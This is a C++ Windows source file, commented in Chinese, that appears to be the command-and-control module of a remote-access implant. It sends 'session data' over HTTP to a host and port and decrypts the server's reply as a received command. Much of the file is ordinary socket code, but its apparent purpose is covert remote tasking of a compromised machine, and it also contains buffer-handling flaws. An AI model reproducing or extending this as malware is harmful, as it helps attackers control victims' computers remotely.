#include "pch.h"
#include <iostream>
#include <ws2tcpip.h>

#include "Cryptor.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// 构造请求包
void ConstructRequestPackage(char** pRequestPackage, int* pRequestPackageLength, char* requestHeader, string sessionData) {
	char requestContentLength[10] = "";
	sprintf_s(requestContentLength, sizeof(requestContentLength), "%d", sessionData.length());

	*pRequestPackageLength = strlen(requestHeader) + strlen(requestContentLength) + 4 + sessionData.length();
	*pRequestPackage = (char*)malloc(*pRequestPackageLength);

	sprintf_s(*pRequestPackage, *pRequestPackageLength, "%s%s\r\n\r\n", requestHeader, requestContentLength);
	memcpy(*pRequestPackage + *pRequestPackageLength - sessionData.length(), sessionData.c_str(), sessionData.length());
}

// 接收命令
string ReceiveCommand(SOCKET clientSocket) {
	// 接收响应包
	char* responsePackage = (char*)malloc(5000);
	int recvLength = 0;
	int currentRecvLength = 0;
	while ((currentRecvLength = recv(clientSocket, responsePackage + recvLength, 5000, 0)) > 0) {
		recvLength += currentRecvLength;
		responsePackage = (char*)realloc(responsePackage, recvLength + 5000);
	}
	if (currentRecvLength == SOCKET_ERROR) {
		free(responsePackage);
		return "";
	}

	// 解析响应头
	int responseContentLength;
	char* partHeader = strstr(responsePackage, "Content-Length");
	if (partHeader) {
		char* contentLengthLast = strchr(partHeader, '\r');
		*contentLengthLast = '\0';
		responseContentLength = atoi(partHeader + 16);
		*contentLengthLast = '\r';
	}
	else {
		free(responsePackage);
		return "";
	}
	if (responseContentLength == 0) {
		free(responsePackage);
		return "";
	}

	char* responseBody = strstr(responsePackage, "\r\n\r\n") + 4;
	DecryptData(responseBody, responseContentLength);
	string responseData = responseBody;
	free(responsePackage);
	return responseData;
}

// HTTP 请求
string HttpRequest(char* host, int port, char* requestHeader, string sessionData) {
	// 构造请求包
	char* requestPackage;
	int requestPackageLength;
	ConstructRequestPackage(&requestPackage, &requestPackageLength, requestHeader, sessionData);

	// 初始化库
	WSADATA lpWSAData;
	if (WSAStartup(MAKEWORD(2, 2), &lpWSAData)) {
		return "";
	}
	// 创建 IPv4 + TCP 套接字
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return "";
	}
	// 通过套接字建立连接
	sockaddr_in sockaddress;
	sockaddress.sin_family = AF_INET;
	sockaddress.sin_port = htons(port);
	if (!inet_pton(AF_INET, host, &(sockaddress.sin_addr))) {
		closesocket(clientSocket);
		WSACleanup();
		return "";
	}
	if (connect(clientSocket, (sockaddr*)&sockaddress, sizeof(sockaddress))) {
		closesocket(clientSocket);
		WSACleanup();
		return "";
	}

	// POST 请求
	if (send(clientSocket, requestPackage, requestPackageLength, 0) == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		return "";
	}
	free(requestPackage);
	string responseData = ReceiveCommand(clientSocket);

	closesocket(clientSocket);
	WSACleanup();
	return responseData;
}